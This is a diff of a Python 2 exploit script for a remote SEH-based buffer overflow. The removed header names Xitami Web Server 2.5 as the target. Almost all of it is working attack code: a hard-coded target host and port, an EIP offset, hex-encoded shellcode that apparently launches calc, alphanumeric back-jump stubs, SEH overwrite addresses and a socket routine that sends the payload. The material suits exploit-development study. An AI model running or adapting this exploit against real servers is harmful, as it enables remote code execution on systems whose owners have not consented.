@@ -1,38 +1,10 @@
 #!/usr/bin/python
-#Author: Samir Sanchez garnica @sasaga92
-#Exploit: Xitami Web Server 2.5 Remote Buffer Overflow (SEH + Egghunter)
 
 import sys
 import socket
 import random
 import string
 import struct
-
-def pattern_create(_type,_length):
-  _type = _type.split(" ")
-
-  if _type[0] == "trash":
-    return _type[1] * _length
-  elif _type[0] == "random":
-    return ''.join(random.choice(string.lowercase) for i in range(_length))
-  elif _type[0] == "pattern":
-    _pattern = ''
-    _parts = ['A', 'a', '0']
-    while len(_pattern) != _length:
-      _pattern += _parts[len(_pattern) % 3]
-      if len(_pattern) % 3 == 0:
-        _parts[2] = chr(ord(_parts[2]) + 1)
-        if _parts[2] > '9':
-          _parts[2] = '0'
-          _parts[1] = chr(ord(_parts[1]) + 1)
-          if _parts[1] > 'z':
-            _parts[1] = 'a'
-            _parts[0] = chr(ord(_parts[0]) + 1)
-            if _parts[0] > 'Z':
-              _parts[0] = 'A'
-    return _pattern
-  else:
-    return "Not Found"
 
 def pwned(_host, _port, _payload):
     print "[*] Conectandose a {0}:{1}...".format(_host, _port)
@@ -46,12 +18,38 @@ def pwned(_host, _port, _payload):
     print "[+] Payload de {0} bytes Enviado.".format(len(_payload))
 
 def main():
+  _host = "192.168.5.129"
+  _port = 9999
+  _offset_eip = 3534
+  _nseh = struct.pack("<L",0x90900674) 
+  _seh  = struct.pack("<L",0x6250160A) #625011BF pop ebx # pop ebx # retn essfunc.dll
+  _espAdj = "\x54\x58\x66\x05\x73\x13\x50\x5C" #0x13a6
+  _backJump1 = ""
+  _backJump1 += "\x25\x4A\x4D\x4E\x55"
+  _backJump1 += "\x25\x35\x32\x31\x2A"
+  _backJump1 += "\x05\x76\x40\x50\x50"
+  _backJump1 += "\x05\x75\x40\x40\x40"
+  _backJump1 += "\x50"
+  _espAdj2 = "\x54\x58\x2c\x2b\x50\x5c"
+  _backJump2 = ""
+  _backJump2 += "\x54\x5B"
+  _backJump2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+  _backJump2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+  _backJump2 += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
+  _backJump2 += "\x05\x11\x11\x66\x52" ## add  eax, 0x52661111
+  _backJump2 += "\x05\x11\x11\x55\x62" ## add  eax, 0x62551111
+  _backJump2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+  _backJump2 += "\x50"                 ## push eax
+  _backJump2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+  _backJump2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+  _backJump2 += "\x05\x41\x76\x66\x07" ## add  eax, 0x07667641
+  _backJump2 += "\x05\x40\x75\x66\x06" ## add  eax, 0x06667540
+  _backJump2 += "\x50"
+  _break = 4000
+  _shellcode = "33d2526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7".decode("hex")
 
-  #_nseh = "\xeb\xae\x90\x90" #jmp negative
-  #_seh = "\x87\x1D\x40" #0x004046B2 pop esi #pop ebx #retn
-  #_egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
 
-  _shellcode = ("\xba\xa2\xcf\xad\x8d\xdb\xd1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
+  _bak = ("\xba\xa2\xcf\xad\x8d\xdb\xd1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
   "\x7e\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2\x57\x70\xe4\x08"
   "\x09\x2d\x2e\xd1\xec\x46\xf5\x22\x56\x96\x3c\x7b\x1e\x5b\x7e"
   "\x78\xef\x23\x71\x82\x3e\x5f\xf1\xd3\x58\x3b\x53\x30\xe6\xbc"
@@ -87,26 +85,19 @@ def main():
   "\x25\xe0\xb0\xef\x04\xb5\x29\x62\xc6\x56\x44\x52\x16\xa3\x63"
   "\x63\xcd\xd1\xc9\x45\x87\x3b\xd6\x4b\x7a\x24\xd5\xd4\x7d\x4c"
   "\x83\x06\x16\x88\x7f")
- 
-  _host = "192.168.5.130"
-  _port = 9999
 
-  #_offset_eip = 3498
-  _offset_eip = 3518
-  _nseh = struct.pack("<L",0xff774242) 
-  _seh  = struct.pack("<L",0x6250160A) #625011BF pop ebx # pop ebx # retn essfunc.dll
-  _esp = "\x25\x41\x4D\x4E\x55\x25\x35\x32\x31\x2A\x54\x58\x2D\x70\x70\x7C\x7C\x2D\x20\x40\x43\x43\x2D\x28\x35\x40\x40\x50\x5C"
-  _jmp_negative = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x34\x72\x77\x77\x05\x23\x61\x66\x66\x05\x23\x52\x55\x55\x2D\x33\x33\x33\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x21\x21\x21\x75\x05\x20\x20\x20\x74\x50"
-  _break = 5000
-  
   _inject = "LTER ."
-  _inject += "A" * (_offset_eip - len(_esp) - 80)
-  _inject += _esp
-  #_inject += _jmp_negative
-  _inject += "A"*80
+  _inject += "\x41"*10
+  _inject += _shellcode
+  _inject += "A" * (3447-len(_shellcode)-10)
+  _inject += _espAdj2
+  _inject += _backJump2
+  _inject += "A" * (_offset_eip - 3447 - len(_espAdj2) - len(_backJump2))
   _inject += _nseh
   _inject += _seh
-  _inject += pattern_create("trash B", _break - len(_inject))
+  _inject += _espAdj
+  _inject += _backJump1
+  _inject += "D" * (_break - len(_inject))
 
   pwned(_host,_port,_inject)
 
